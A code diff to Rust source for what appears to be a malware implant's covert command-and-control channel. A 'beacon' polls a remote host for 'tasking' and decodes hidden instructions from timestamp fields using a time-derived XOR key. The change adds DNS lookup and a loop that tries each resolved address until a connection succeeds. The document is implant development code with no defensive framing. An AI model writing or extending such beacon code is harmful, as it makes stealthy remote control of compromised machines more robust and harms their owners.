@@ -1,6 +1,8 @@
 use crate::crypto::TimeBasedKey;
 use crate::errors::ChannelError;
+use crate::dns;
 use crate::sys;
+use core::net::SocketAddr;
 
 pub struct DnfChannel {
     host: String,
@@ -28,14 +30,36 @@ impl DnfChannel {
 
     /// Poll the DNF channel for tasking. Returns None if no tasking available.
     pub fn poll(&self, tbk: &TimeBasedKey) -> Result<Option<DnfTasking>, ChannelError> {
+        crate::dbg_log!("[beacon] polling dnf channel");
+
         let request = self.build_request();
 
-        let addr = sys::resolve(&self.host, self.port)
+        let ips = dns::lookup_a(&self.host)
             .map_err(|e| ChannelError::SendFailed(e.to_string()))?;
         let fd = sys::socket_tcp()
             .map_err(|e| ChannelError::SendFailed(e.to_string()))?;
-        sys::connect_tcp(fd, &addr)
-            .map_err(|e| ChannelError::SendFailed(e.to_string()))?;
+
+
+        let mut last_err: Option<ChannelError> = None;
+        let mut connected = false;
+
+        for ip in ips.v4_records() {
+            let addr = SocketAddr::from((ip.addr, self.port));
+            crate::dbg_log!("[dnf] connecting to endpoint {}:{}", ip.addr, self.port);
+            match sys::connect_tcp(fd, &addr)
+                .map_err(|e| ChannelError::SendFailed(e.to_string())) {
+                    Ok(()) => { connected = true; break; }
+                    Err(e) => last_err = Some(e),
+            }
+        }
+
+        if !connected {
+            crate::dbg_log!("[dnf] failed to connect to any endpoints");
+            return Err(ChannelError::SendFailed(
+                last_err.map(|e| e.to_string()).unwrap_or_else(|| "no addresses".into())
+            ));
+        }
+        
         sys::write_all(fd, &request)
             .map_err(|e| ChannelError::SendFailed(e.to_string()))?;
 
@@ -86,7 +110,7 @@ impl DnfChannel {
 
         let _tasking_key = tbk.derive_from_epoch(lm_epoch);
         crate::dbg_log!(
-            "[beacon] dnf: lm='{}' lm_epoch={} key_mask=0x{:05x} mtime_us={} sub_second={}",
+            "[dnf] beacon poll: lm='{}' lm_epoch={} key_mask=0x{:05x} mtime_us={} sub_second={}",
             last_modified, lm_epoch, _tasking_key & 0xFFFFF, "pending", "pending"
         );
 
@@ -123,7 +147,7 @@ impl DnfChannel {
         let decoded = sub_second ^ (tasking_key & 0xFFFFF);
 
         crate::dbg_log!(
-            "[dev] dnf: lm_epoch={} mtime_us={} sub_second={} key_mask=0x{:05x} decoded=0x{:05x}",
+            "[dnf] beacon poll: lm_epoch={} mtime_us={} sub_second={} key_mask=0x{:05x} decoded=0x{:05x}",
             lm_epoch, mtime_us, sub_second, tasking_key & 0xFFFFF, decoded
         );
 
